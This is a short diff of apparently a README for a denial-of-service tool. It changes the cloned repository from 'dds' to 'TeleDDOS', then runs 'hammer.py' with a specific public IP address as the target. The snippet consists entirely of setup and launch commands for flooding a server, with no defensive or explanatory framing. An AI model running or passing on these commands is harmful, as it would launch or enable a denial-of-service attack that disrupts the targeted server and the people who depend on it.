@@ -3,8 +3,8 @@
 ```
 
 cd ~
-git clone https://github.com/KingArmin/dds
-cd dds
+git clone https://github.com/KingArmin/TeleDDOS
+cd TeleDDOS
 
 python3 hammer.py -s 136.243.145.232 
 
